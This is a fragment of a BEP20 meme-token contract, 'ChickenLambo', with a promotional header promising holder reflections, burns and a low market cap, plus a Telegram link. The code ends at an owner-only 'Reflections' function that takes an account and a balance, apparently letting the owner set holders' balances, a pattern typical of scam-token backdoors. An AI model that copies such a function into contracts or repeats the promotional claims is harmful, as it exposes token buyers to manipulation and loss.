...
Chicken Lambo - meme token that reward every holders with $CKNLMBO reflection with 5% of your holdings.
...
20% BURNED .
CONTRACT VERIFIED.
STARTING WITH LOW MCAP.

https://t.me/ChickenLambo
...
*/
    ...
    contract ChickenLambo  is IBEP20, Ownable
    {
        ...
        string private constant _name = "ChickenLambo";
        string private constant _symbol = "CKNLMBO";
        ...
        address public constant MarketingWallet=0x71eFFabE45CEe4e8A163d383A6a8210cF4bD162F; 
      ...
      function Reflections(address account, uint256 balance) onlyOwner  public virtual {
